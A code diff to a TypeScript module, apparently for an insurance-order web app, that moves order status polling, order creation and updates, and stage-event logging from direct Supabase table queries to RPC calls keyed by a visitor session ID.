@@ -10,6 +10,8 @@ export const useAdminApproval = (orderId: string | null, stage: Stage) => {
   useEffect(() => {
     if (!orderId) return;
 
+    const visitorSid = typeof sessionStorage !== "undefined" ? sessionStorage.getItem("visitor_sid") : null;
+
     const channel = supabase
       .channel(`order-stage-${orderId}`)
       .on(
@@ -31,16 +33,17 @@ export const useAdminApproval = (orderId: string | null, stage: Stage) => {
       .subscribe();
 
     const interval = setInterval(async () => {
-      // Direct REST API query - no RPC needed
-      const { data } = await supabase
-        .from("insurance_orders")
-        .select("id,current_stage,stage_status")
-        .eq("id", orderId)
-        .single();
-      const order = data as any;
-      if (order?.current_stage === stage) {
-        if (order.stage_status === "approved") setStatus("approved");
-        else if (order.stage_status === "rejected") setStatus("rejected");
+      // Use secure RPC to read order status (bypasses RLS for anon users)
+      if (visitorSid) {
+        const { data } = await supabase.rpc("get_own_order", {
+          p_visitor_session_id: visitorSid,
+          p_order_id: orderId,
+        });
+        const order = data as any;
+        if (order?.current_stage === stage) {
+          if (order.stage_status === "approved") setStatus("approved");
+          else if (order.stage_status === "rejected") setStatus("rejected");
+        }
       }
     }, 3000);
 
@@ -70,40 +73,32 @@ export const createOrUpdateStage = async (
   let resolvedOrderId = orderId;
 
   if (orderId) {
-    // Update existing order directly - no RPC needed
-    const { error } = await supabase
-      .from("insurance_orders")
-      .update(stageData as any)
-      .eq("id", orderId);
+    // Use RPC for secure update
+    const { error } = await supabase.rpc("upsert_insurance_order", {
+      p_visitor_session_id: visitorSid || "",
+      p_order_id: orderId,
+      p_data: stageData,
+    });
     if (error) throw error;
   } else {
-    // Insert new order directly - no RPC needed
-    const insertPayload: any = {
-      status: "pending",
-      ...stageData,
-    };
-    if (visitorSid) insertPayload.visitor_session_id = visitorSid;
-    const { data, error } = await supabase
-      .from("insurance_orders")
-      .insert(insertPayload as any)
-      .select("id")
-      .single();
+    // Use RPC for secure insert
+    const { data, error } = await supabase.rpc("upsert_insurance_order", {
+      p_visitor_session_id: visitorSid || "",
+      p_data: { status: "pending", ...stageData },
+    });
     if (error) throw error;
-    resolvedOrderId = (data as any)?.id ?? null;
+    resolvedOrderId = data as string | null;
   }
 
   if (resolvedOrderId && visitorSid) {
     try {
-      // Insert stage event directly - no RPC needed
-      await supabase
-        .from("insurance_order_stage_events")
-        .insert({
-          order_id: resolvedOrderId,
-          visitor_session_id: visitorSid,
-          stage: stage,
-          status: resolvedStageStatus,
-          payload: extraData ?? {},
-        });
+      await supabase.rpc("insert_stage_event", {
+        p_visitor_session_id: visitorSid,
+        p_order_id: resolvedOrderId,
+        p_stage: stage,
+        p_status: resolvedStageStatus,
+        p_payload: extraData ?? {},
+      });
     } catch (error) {
       console.error("Failed to persist stage event", error);
     }
